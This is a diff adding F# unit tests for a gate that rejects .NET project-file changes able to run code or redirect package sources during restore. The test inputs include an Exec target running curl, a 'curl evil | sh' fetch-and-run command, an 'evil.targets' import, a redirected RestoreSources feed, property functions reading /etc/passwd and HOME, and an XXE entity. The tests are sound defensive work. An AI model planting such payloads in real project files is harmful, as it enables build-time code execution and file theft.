@@ -377,6 +377,52 @@ let tests: (string * (unit -> unit)) list =
           equal [ TaskId "T-002" ] r.Rerun "rerun"
           equal [ DecisionId "D-0043" ] (Regeneration.between after handover plan).Changed "removed"
 
+      // ---------- restore gate ----------
+      "restore gate: package and project references are fine, new file or edit", fun () ->
+          let before = """<Project Sdk="Microsoft.NET.Sdk"><PropertyGroup><TargetFramework>net9.0</TargetFramework></PropertyGroup></Project>"""
+          let after = """<Project Sdk="Microsoft.NET.Sdk">
+  <PropertyGroup><TargetFramework>net9.0</TargetFramework><IsPackable>false</IsPackable><Nullable>enable</Nullable></PropertyGroup>
+  <ItemGroup>
+    <PackageReference Include="xunit" Version="2.9.2" />
+    <PackageReference Include="coverlet.collector" Version="6.0.2"><PrivateAssets>all</PrivateAssets><IncludeAssets>runtime; build</IncludeAssets></PackageReference>
+    <ProjectReference Include="..\..\src\Pricing.Api\Pricing.Api.csproj" />
+  </ItemGroup>
+</Project>"""
+          equal (Ok ()) (ProjectFileChange.check (Some before) after) "edit"
+          equal (Ok ()) (ProjectFileChange.check None after) "new file"
+          let fsproj = """<Project Sdk="Microsoft.NET.Sdk"><ItemGroup><Compile Include="Domain.fs" /></ItemGroup></Project>"""
+          equal (Ok ()) (ProjectFileChange.check None fsproj) "F# compile order"
+      "restore gate: anything that runs or redirects during a restore is refused", fun () ->
+          let refused after (needle: string) =
+              match ProjectFileChange.check None after with
+              | Error es -> check (es |> List.exists (fun e -> e.Contains needle)) $"%A{es}"
+              | Ok () -> check false $"accepted: {after}"
+          refused """<Project Sdk="Microsoft.NET.Sdk"><Target Name="X" BeforeTargets="Restore"><Exec Command="curl x" /></Target></Project>""" "Target"
+          refused """<Project Sdk="Microsoft.NET.Sdk"><Import Project="evil.targets" /></Project>""" "Import"
+          refused """<Project Sdk="Microsoft.NET.Sdk"><PropertyGroup><RestoreSources>https://evil/v3/index.json</RestoreSources></PropertyGroup></Project>""" "RestoreSources"
+          refused """<Project Sdk="Contoso.Sdk/1.0.0"></Project>""" "Contoso.Sdk/1.0.0"
+          refused """<Project Sdk="Microsoft.NET.Sdk" InitialTargets="X"></Project>""" "InitialTargets"
+          refused """<Project Sdk="Microsoft.NET.Sdk"><PropertyGroup><RootNamespace>$([System.IO.File]::ReadAllText('/etc/passwd'))</RootNamespace></PropertyGroup></Project>""" "property function"
+          refused """<Project Sdk="Microsoft.NET.Sdk"><ItemGroup><PackageReference Include="x" Version="$([System.Environment]::GetEnvironmentVariable('HOME'))" /></ItemGroup></Project>""" "property function"
+          refused """<Project Sdk="Microsoft.NET.Sdk"><ItemGroup>""" "XML"
+          refused """<!DOCTYPE p [<!ENTITY e SYSTEM "file:///etc/passwd">]><Project Sdk="Microsoft.NET.Sdk"></Project>""" "XML"
+      "restore gate: what the repo already had is trusted; only the change is checked", fun () ->
+          let before = """<Project Sdk="Microsoft.NET.Sdk"><Target Name="Gen" BeforeTargets="Build"><Exec Command="./gen.sh" /></Target></Project>"""
+          let after = """<Project Sdk="Microsoft.NET.Sdk"><Target Name="Gen" BeforeTargets="Build"><Exec Command="./gen.sh" /></Target><ItemGroup><PackageReference Include="xunit" Version="2.9.2" /></ItemGroup></Project>"""
+          equal (Ok ()) (ProjectFileChange.check (Some before) after) "untouched target"
+          let edited = before.Replace("./gen.sh", "curl evil | sh")
+          check (Result.isError (ProjectFileChange.check (Some before) edited)) "an edited target is a new one"
+      "restore gate: review picks the rule by file", fun () ->
+          let csproj = """<Project Sdk="Microsoft.NET.Sdk"><ItemGroup><PackageReference Include="xunit" Version="2.9.2" /></ItemGroup></Project>"""
+          equal (Ok ()) (ProjectFileChange.review "tests/A.Tests/A.Tests.csproj" None (Some csproj)) "project file"
+          equal (Ok ()) (ProjectFileChange.review "src/X.cs" None (Some "class X {}")) "not a restore input"
+          equal (Ok ()) (ProjectFileChange.review "tests/A.Tests/A.Tests.csproj" (Some csproj) None) "deleted"
+          let cpm = """<Project><PropertyGroup><ManagePackageVersionsCentrally>true</ManagePackageVersionsCentrally></PropertyGroup><ItemGroup><PackageVersion Include="xunit" Version="2.9.2" /></ItemGroup></Project>"""
+          equal (Ok ()) (ProjectFileChange.review "Directory.Packages.props" None (Some cpm)) "central package versions"
+          for path in [ "nuget.config"; "src/NuGet.Config"; "Directory.Build.props"; "src/Directory.Build.targets"; "build/x.props"; "x.targets"; "global.json" ] do
+              check (Result.isError (ProjectFileChange.review path None (Some "<Project />"))) path
+          check (ProjectFileChange.affectsRestore "src/A/A.fsproj" && ProjectFileChange.affectsRestore "NuGet.config"
+                 && not (ProjectFileChange.affectsRestore "src/A/A.cs")) "affectsRestore"
       // ---------- json ----------
       "json: malformed plan reports every problem at once", fun () ->
           let bad = """{ "handover": {"id":"x","digest":"y"}, "tasks": [ {"id":"A"}, {"id":"B","title":"t","instructions":"i","writes":["../x"]} ] }"""
